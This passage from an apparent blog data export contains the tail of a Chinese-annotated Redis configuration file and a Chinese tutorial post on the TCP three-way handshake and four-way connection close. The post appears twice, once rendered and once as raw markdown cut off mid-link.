&#x8FD9;&#x4E2A;Hash&#x7684;&#x6210;&#x5458;&#x6BD4;&#x8F83;&#x5C11;&#x65F6;Redis&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x5185;&#x5B58;&#x4F1A;&#x91C7;&#x7528;&#x7C7B;&#x4F3C;&#x4E00;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#xFF0C;&#x800C;&#x4E0D;&#x4F1A;&#x91C7;&#x7528;&#x771F;&#x6B63;&#x7684;HashMap&#x7ED3;&#x6784;&#xFF0C;&#x5BF9;&#x5E94;&#x7684;value redisObject&#x7684;encoding&#x4E3A;zipmap,</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x6210;&#x5458;&#x6570;&#x91CF;&#x589E;&#x5927;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8F6C;&#x6210;&#x771F;&#x6B63;&#x7684;HashMap,&#x6B64;&#x65F6;encoding&#x4E3A;ht&#x3002;</span></span><br><span class=\"line\"><span class=\"built_in\">hash</span>-max-zipmap-entries 512</span><br><span class=\"line\"><span class=\"built_in\">hash</span>-max-zipmap-value 64</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># list&#x6570;&#x636E;&#x7C7B;&#x578B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x53BB;&#x6307;&#x9488;&#x7684;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># list&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x503C;&#x5927;&#x5C0F;&#x5C0F;&#x4E8E;&#x591A;&#x5C11;&#x5B57;&#x8282;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;</span></span><br><span class=\"line\">list-max-ziplist-entries 512</span><br><span class=\"line\">list-max-ziplist-value 64</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># set&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5185;&#x90E8;&#x6570;&#x636E;&#x5982;&#x679C;&#x5168;&#x90E8;&#x662F;&#x6570;&#x503C;&#x578B;&#xFF0C;&#x4E14;&#x5305;&#x542B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x683C;&#x5F0F;&#x5B58;&#x50A8;&#x3002;</span></span><br><span class=\"line\"><span class=\"built_in\">set</span>-max-intset-entries 512</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># zsort&#x6570;&#x636E;&#x7C7B;&#x578B;&#x591A;&#x5C11;&#x8282;&#x70B9;&#x4EE5;&#x4E0B;&#x4F1A;&#x91C7;&#x7528;&#x53BB;&#x6307;&#x9488;&#x7684;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># zsort&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x503C;&#x5927;&#x5C0F;&#x5C0F;&#x4E8E;&#x591A;&#x5C11;&#x5B57;&#x8282;&#x4F1A;&#x91C7;&#x7528;&#x7D27;&#x51D1;&#x5B58;&#x50A8;&#x683C;&#x5F0F;&#x3002;</span></span><br><span class=\"line\">zset-max-ziplist-entries 128</span><br><span class=\"line\">zset-max-ziplist-value 64</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis&#x5C06;&#x5728;&#x6BCF;100&#x6BEB;&#x79D2;&#x65F6;&#x4F7F;&#x7528;1&#x6BEB;&#x79D2;&#x7684;CPU&#x65F6;&#x95F4;&#x6765;&#x5BF9;redis&#x7684;hash&#x8868;&#x8FDB;&#x884C;&#x91CD;&#x65B0;hash&#xFF0C;&#x53EF;&#x4EE5;&#x964D;&#x4F4E;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x4F60;&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x6709;&#x975E;&#x5E38;&#x4E25;&#x683C;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#x9700;&#x8981;&#xFF0C;&#x4E0D;&#x80FD;&#x591F;&#x63A5;&#x53D7;Redis&#x65F6;&#x4E0D;&#x65F6;&#x7684;&#x5BF9;&#x8BF7;&#x6C42;&#x6709;2&#x6BEB;&#x79D2;&#x7684;&#x5EF6;&#x8FDF;&#x7684;&#x8BDD;&#xFF0C;&#x628A;&#x8FD9;&#x9879;&#x914D;&#x7F6E;&#x4E3A;no&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x6CA1;&#x6709;&#x8FD9;&#x4E48;&#x4E25;&#x683C;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#x8981;&#x6C42;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E3A;yes&#xFF0C;&#x4EE5;&#x4FBF;&#x80FD;&#x591F;&#x5C3D;&#x53EF;&#x80FD;&#x5FEB;&#x7684;&#x91CA;&#x653E;&#x5185;&#x5B58;</span></span><br><span class=\"line\">activerehashing yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># HyperLogLog sparse representation bytes limit. The limit includes the</span></span><br><span class=\"line\"><span class=\"comment\"># 16 bytes header. When an HyperLogLog using the sparse representation crosses</span></span><br><span class=\"line\"><span class=\"comment\"># this limit, it is converted into the dense representation.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A value greater than 16000 is totally useless, since at that point the</span></span><br><span class=\"line\"><span class=\"comment\"># dense representation is more memory efficient.</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># The suggested value is ~ 3000 in order to have the benefits of</span></span><br><span class=\"line\"><span class=\"comment\"># the space efficient encoding without slowing down too much PFADD,</span></span><br><span class=\"line\"><span class=\"comment\"># which is O(N) with the sparse encoding. The value can be raised to</span></span><br><span class=\"line\"><span class=\"comment\"># ~ 10000 when CPU is not a concern, but space is, and the data set is</span></span><br><span class=\"line\"><span class=\"comment\"># composed of many HyperLogLogs with cardinality in the 0 - 15000 range.</span></span><br><span class=\"line\">hll-sparse-max-bytes 3000</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The client output buffer limits can be used to force disconnection of clients</span></span><br><span class=\"line\"><span class=\"comment\"># that are not reading data from the server fast enough for some reason (a</span></span><br><span class=\"line\"><span class=\"comment\"># common reason is that a Pub/Sub client can&apos;t consume messages as fast as the</span></span><br><span class=\"line\"><span class=\"comment\"># publisher can produce them).</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The limit can be set differently for the three different classes of clients:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># normal -&gt; normal clients</span></span><br><span class=\"line\"><span class=\"comment\"># slave  -&gt; slave clients and MONITOR clients</span></span><br><span class=\"line\"><span class=\"comment\"># pubsub -&gt; clients subscribed to at least one pubsub channel or pattern</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The syntax of every client-output-buffer-limit directive is the following:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A client is immediately disconnected once the hard limit is reached, or if</span></span><br><span class=\"line\"><span class=\"comment\"># the soft limit is reached and remains reached for the specified number of</span></span><br><span class=\"line\"><span class=\"comment\"># seconds (continuously).</span></span><br><span class=\"line\"><span class=\"comment\"># So for instance if the hard limit is 32 megabytes and the soft limit is</span></span><br><span class=\"line\"><span class=\"comment\"># 16 megabytes / 10 seconds, the client will get disconnected immediately</span></span><br><span class=\"line\"><span class=\"comment\"># if the size of the output buffers reach 32 megabytes, but will also get</span></span><br><span class=\"line\"><span class=\"comment\"># disconnected if the client reaches 16 megabytes and continuously overcomes</span></span><br><span class=\"line\"><span class=\"comment\"># the limit for 10 seconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default normal clients are not limited because they don&apos;t receive data</span></span><br><span class=\"line\"><span class=\"comment\"># without asking (in a push way), but just after a request, so only</span></span><br><span class=\"line\"><span class=\"comment\"># asynchronous clients may create a scenario where data is requested faster</span></span><br><span class=\"line\"><span class=\"comment\"># than it can read.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Instead there is a default limit for pubsub and slave clients, since</span></span><br><span class=\"line\"><span class=\"comment\"># subscribers and slaves receive data in a push fashion.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Both the hard or the soft limit can be disabled by setting them to zero.</span></span><br><span class=\"line\">client-output-buffer-limit normal 0 0 0</span><br><span class=\"line\">client-output-buffer-limit slave 256mb 64mb 60</span><br><span class=\"line\">client-output-buffer-limit pubsub 32mb 8mb 60</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Redis calls an internal function to perform many background tasks, like</span></span><br><span class=\"line\"><span class=\"comment\"># closing connections of clients in timeout, purging expired keys that are</span></span><br><span class=\"line\"><span class=\"comment\"># never requested, and so forth.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Not all tasks are performed with the same frequency, but Redis checks for</span></span><br><span class=\"line\"><span class=\"comment\"># tasks to perform accordingly to the specified &quot;hz&quot; value.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default &quot;hz&quot; is set to 10. Raising the value will use more CPU when</span></span><br><span class=\"line\"><span class=\"comment\"># Redis is idle, but at the same time will make Redis more responsive when</span></span><br><span class=\"line\"><span class=\"comment\"># there are many keys expiring at the same time, and timeouts may be</span></span><br><span class=\"line\"><span class=\"comment\"># handled with more precision.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The range is between 1 and 500, however a value over 100 is usually not</span></span><br><span class=\"line\"><span class=\"comment\"># a good idea. Most users should use the default of 10 and raise this up to</span></span><br><span class=\"line\"><span class=\"comment\"># 100 only in environments where very low latency is required.</span></span><br><span class=\"line\">hz 10</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># When a child rewrites the AOF file, if the following option is enabled</span></span><br><span class=\"line\"><span class=\"comment\"># the file will be fsync-ed every 32 MB of data generated. This is useful</span></span><br><span class=\"line\"><span class=\"comment\"># in order to commit the file to the disk more incrementally and avoid</span></span><br><span class=\"line\"><span class=\"comment\"># big latency spikes.</span></span><br><span class=\"line\">aof-rewrite-incremental-fsync yes</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">################################## INCLUDES ###################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5047;&#x5982;&#x8BF4;&#x4F60;&#x6709;&#x4E00;&#x4E2A;&#x53EF;&#x7528;&#x4E8E;&#x6240;&#x6709;&#x7684; redis server &#x7684;&#x6807;&#x51C6;&#x914D;&#x7F6E;&#x6A21;&#x677F;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x9488;&#x5BF9;&#x67D0;&#x4E9B; server &#x53C8;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x4E2A;&#x6027;&#x5316;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; include &#x6765;&#x5305;&#x542B;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x5BF9;&#x4F60;&#x6765;&#x8BF4;&#x662F;&#x975E;&#x5E38;&#x6709;&#x7528;&#x7684;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F;&#x8981;&#x6CE8;&#x610F;&#x54E6;&#xFF0C;include &#x662F;&#x4E0D;&#x80FD;&#x88AB; config rewrite &#x547D;&#x4EE4;&#x6539;&#x5199;&#x7684;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x7531;&#x4E8E; redis &#x603B;&#x662F;&#x4EE5;&#x6700;&#x540E;&#x7684;&#x52A0;&#x5DE5;&#x7EBF;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x6307;&#x4EE4;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x4F60;&#x6700;&#x597D;&#x662F;&#x628A; include &#x653E;&#x5728;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x524D;&#x9762;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4EE5;&#x907F;&#x514D;&#x5728;&#x8FD0;&#x884C;&#x65F6;&#x8986;&#x76D6;&#x914D;&#x7F6E;&#x7684;&#x6539;&#x53D8;&#xFF0C;&#x76F8;&#x53CD;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x653E;&#x5728;&#x540E;&#x9762;&#xFF08;&#x5916;&#x56FD;&#x4EBA;&#x771F;&#x5570;&#x55E6;&#xFF09;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># include /path/to/local.conf</span></span><br><span class=\"line\"><span class=\"comment\"># include /path/to/other.conf</span></span><br></pre></td></tr></table></figure>"},{"title":"TCP三次握手与四次分手","date":"2016-10-29T14:10:00.000Z","_content":"\n## TCP简介\n\n首先来看看OSI的七层模型：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/1.jpg)\n\n我们需要知道TCP工作在网络OSI的七层模型中的第四层——Transport层，IP在第三层——Network层，ARP在第二层——Data Link层；在第二层上的数据，我们把它叫Frame，在第三层上的数据叫Packet，第四层的数据叫Segment。 同时，我们需要简单的知道，数据从应用层发下来，会在每一层都会加上头部信息，进行封装，然后再发送到数据接收端。这个基本的流程你需要知道，就是每个数据都会经过数据的封装和解封装的过程。 在OSI七层模型中，每一层的作用和对应的协议如下： \n\n<!-- more -->\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/2.jpg)\n\nTCP是一个协议，那这个协议是如何定义的，它的数据格式是什么样子的呢？要进行更深层次的剖析，就需要了解，甚至是熟记TCP协议中每个字段的含义。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/3.jpg)\n\n上面就是TCP协议头部的格式，由于它太重要了，是理解其它内容的基础，下面就将每个字段的信息都详细的说明一下。\n\n- Source Port和Destination Port:分别占用16位，表示源端口号和目的端口号；用于区别主机中的不同进程，而IP地址是用来区分不同的主机的，源端口号和目的端口号配合上IP首部中的源IP地址和目的IP地址就能唯一的确定一个TCP连接；\n- Sequence Number:用来标识从TCP发端向TCP收端发送的数据字节流，它表示在这个报文段中的的第一个数据字节在数据流中的序号；主要用来解决网络报乱序的问题；\n- Acknowledgment Number:32位确认序列号包含发送确认的一端所期望收到的下一个序号，因此，确认序号应当是上次已成功收到数据字节序号加1。不过，只有当标志位中的ACK标志（下面介绍）为1时该确认序列号的字段才有效。主要用来解决不丢包的问题；\n- Offset:给出首部中32 bit字的数目，需要这个值是因为任选字段的长度是可变的。这个字段占4bit（最多能表示15个32bit的的字，即4*15=60个字节的首部长度），因此TCP最多有60字节的首部。然而，没有任选字段，正常的长度是20字节；\n- TCP Flags:TCP首部中有6个标志比特，它们中的多个可同时被设置为1，主要是用于操控TCP的状态机的，依次为URG，ACK，PSH，RST，SYN，FIN。每个标志位的意思如下：\n  - URG：此标志表示TCP包的紧急指针域（后面马上就要说到）有效，用来保证TCP连接不被中断，并且督促中间层设备要尽快处理这些数据；\n  - ACK：此标志表示应答域有效，就是说前面所说的TCP应答号将会包含在TCP数据包中；有两个取值：0和1，为1的时候表示应答域有效，反之为0；\n  - PSH：这个标志位表示Push操作。所谓Push操作就是指在数据包到达接收端以后，立即传送给应用程序，而不是在缓冲区中排队；\n  - RST：这个标志表示连接复位请求。用来复位那些产生错误的连接，也被用来拒绝错误和非法的数据包；\n  - SYN：表示同步序号，用来建立连接。SYN标志位和ACK标志位搭配使用，当连接请求的时候，SYN=1，ACK=0；连接被响应的时候，SYN=1，ACK=1；这个标志的数据包经常被用来进行端口扫描。扫描者发送一个只有SYN的数据包，如果对方主机响应了一个数据包回来 ，就表明这台主机存在这个端口；但是由于这种扫描方式只是进行TCP三次握手的第一次握手，因此这种扫描的成功表示被扫描的机器不很安全，一台安全的主机将会强制要求一个连接严格的进行TCP的三次握手；\n  - FIN： 表示发送端已经达到数据末尾，也就是说双方的数据传送完成，没有数据可以传送了，发送FIN标志位的TCP数据包后，连接将被断开。这个标志的数据包也经常被用于进行端口扫描。\n- Window:窗口大小，也就是有名的滑动窗口，用来进行流量控制；这是一个复杂的问题，这篇博文中并不会进行总结的；\n\n---\n\n## TCP三次握手\n建立TCP需要三次握手才能建立，而断开连接则需要四次握手。整个过程如下图所示：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/4.jpg)\n\n先来看看如何建立连接的。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/5.jpg)\n- 第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；\n- 第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；\n- 第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。\n\n**其实三次握手就是，A告诉B要连接，B通知A可以连接了，A再告诉B，那我连接了。**\n\n---\n\n## TCP四次挥手\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/6.jpg)\n假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说\"**我Client端没有数据要发给你了**\"，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，\"**告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息**\"。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，\"**告诉Client端，好了，我这边数据发完了，准备好关闭连接了**\"。Client端收到FIN报文后，\"**就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传**。\"Server端收到ACK后，\"**就知道可以断开连接了**\"。Client端等待了2MSL后依然没有收到回复，则**证明Server端已正常关闭，那好，我Client端也可以关闭连接了**。Ok，TCP连接就这样关闭了！\n\n整个过程Client端所经历的状态如下：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/7.jpg)\n\n而Server端所经历的过程如下：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/8.jpg)\n\n---\n\n## 相关疑问\n**【问题1】为什么连接的时候是三次握手，关闭的时候却是四次握手？**\n答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，\"你发的FIN报文我收到了\"。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。\n\n**【问题2】为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？**\n答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假象网络是不可靠的，有可以最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。\n\n**【问题3】为什么不能用两次握手进行连接？**\n我们知道，3次握手完成两个重要的功能，既要双方做好发送数据的准备工作(双方都知道彼此已准备好)，也要允许双方就初始序列号进行协商，这个序列号在握手过程中被发送和确认。\n现在把三次握手改成仅需要两次握手，死锁是可能发生的。作为例子，考虑计算机S和C之间的通信，假定C给S发送一个连接请求分组，S收到了这个分组，并发送了确认应答分组。按照两次握手的协定，S认为连接已经成功地建立了，可以开始发送数据分组。可是，C在S的应答分组在传输中被丢失的情况下，将不知道S是否已准备好，不知道S建立什么样的序列号，C甚至怀疑S是否收到自己的连接请求分组。在这种情况下，C认为连接还未建立成功，将忽略S发来的任何数据分 组，只等待连接确认应答分组。而S在发出的分组超时后，重复发送同样的分组。这样就形成了死锁。","source":"_posts/TCP三次握手与四次分手.md","raw":"---\ntitle: TCP三次握手与四次分手\ncategories:\n  - 算法及理论\ntags:\n  - tcp\ndate: 2016-10-29 22:10:00\n\n---\n\n## TCP简介\n\n首先来看看OSI的七层模型：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/1.jpg)\n\n我们需要知道TCP工作在网络OSI的七层模型中的第四层——Transport层，IP在第三层——Network层，ARP在第二层——Data Link层；在第二层上的数据，我们把它叫Frame，在第三层上的数据叫Packet，第四层的数据叫Segment。 同时，我们需要简单的知道，数据从应用层发下来，会在每一层都会加上头部信息，进行封装，然后再发送到数据接收端。这个基本的流程你需要知道，就是每个数据都会经过数据的封装和解封装的过程。 在OSI七层模型中，每一层的作用和对应的协议如下： \n\n<!-- more -->\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/2.jpg)\n\nTCP是一个协议，那这个协议是如何定义的，它的数据格式是什么样子的呢？要进行更深层次的剖析，就需要了解，甚至是熟记TCP协议中每个字段的含义。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/3.jpg)\n\n上面就是TCP协议头部的格式，由于它太重要了，是理解其它内容的基础，下面就将每个字段的信息都详细的说明一下。\n\n- Source Port和Destination Port:分别占用16位，表示源端口号和目的端口号；用于区别主机中的不同进程，而IP地址是用来区分不同的主机的，源端口号和目的端口号配合上IP首部中的源IP地址和目的IP地址就能唯一的确定一个TCP连接；\n- Sequence Number:用来标识从TCP发端向TCP收端发送的数据字节流，它表示在这个报文段中的的第一个数据字节在数据流中的序号；主要用来解决网络报乱序的问题；\n- Acknowledgment Number:32位确认序列号包含发送确认的一端所期望收到的下一个序号，因此，确认序号应当是上次已成功收到数据字节序号加1。不过，只有当标志位中的ACK标志（下面介绍）为1时该确认序列号的字段才有效。主要用来解决不丢包的问题；\n- Offset:给出首部中32 bit字的数目，需要这个值是因为任选字段的长度是可变的。这个字段占4bit（最多能表示15个32bit的的字，即4*15=60个字节的首部长度），因此TCP最多有60字节的首部。然而，没有任选字段，正常的长度是20字节；\n- TCP Flags:TCP首部中有6个标志比特，它们中的多个可同时被设置为1，主要是用于操控TCP的状态机的，依次为URG，ACK，PSH，RST，SYN，FIN。每个标志位的意思如下：\n  - URG：此标志表示TCP包的紧急指针域（后面马上就要说到）有效，用来保证TCP连接不被中断，并且督促中间层设备要尽快处理这些数据；\n  - ACK：此标志表示应答域有效，就是说前面所说的TCP应答号将会包含在TCP数据包中；有两个取值：0和1，为1的时候表示应答域有效，反之为0；\n  - PSH：这个标志位表示Push操作。所谓Push操作就是指在数据包到达接收端以后，立即传送给应用程序，而不是在缓冲区中排队；\n  - RST：这个标志表示连接复位请求。用来复位那些产生错误的连接，也被用来拒绝错误和非法的数据包；\n  - SYN：表示同步序号，用来建立连接。SYN标志位和ACK标志位搭配使用，当连接请求的时候，SYN=1，ACK=0；连接被响应的时候，SYN=1，ACK=1；这个标志的数据包经常被用来进行端口扫描。扫描者发送一个只有SYN的数据包，如果对方主机响应了一个数据包回来 ，就表明这台主机存在这个端口；但是由于这种扫描方式只是进行TCP三次握手的第一次握手，因此这种扫描的成功表示被扫描的机器不很安全，一台安全的主机将会强制要求一个连接严格的进行TCP的三次握手；\n  - FIN： 表示发送端已经达到数据末尾，也就是说双方的数据传送完成，没有数据可以传送了，发送FIN标志位的TCP数据包后，连接将被断开。这个标志的数据包也经常被用于进行端口扫描。\n- Window:窗口大小，也就是有名的滑动窗口，用来进行流量控制；这是一个复杂的问题，这篇博文中并不会进行总结的；\n\n---\n\n## TCP三次握手\n建立TCP需要三次握手才能建立，而断开连接则需要四次握手。整个过程如下图所示：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/4.jpg)\n\n先来看看如何建立连接的。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/5.jpg)\n- 第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；\n- 第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；\n- 第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。\n\n**其实三次握手就是，A告诉B要连接，B通知A可以连接了，A再告诉B，那我连接了。**\n\n---\n\n## TCP四次挥手\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/6.jpg)\n假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说\"**我Client端没有数据要发给你了**\"，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，\"**告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息**\"。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，\"**告诉Client端，好了，我这边数据发完了，准备好关闭连接了**\"。Client端收到FIN报文后，\"**就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传**。\"Server端收到ACK后，\"**就知道可以断开连接了**\"。Client端等待了2MSL后依然没有收到回复，则**证明Server端已正常关闭，那好，我Client端也可以关闭连接了**。Ok，TCP连接就这样关闭了！\n\n整个过程Client端所经历的状态如下：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E4%B8%8E%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/7.jpg)\n\n而Server端所经历的过程如下：\n\n![](http://7xvfir.com1.z0.glb.c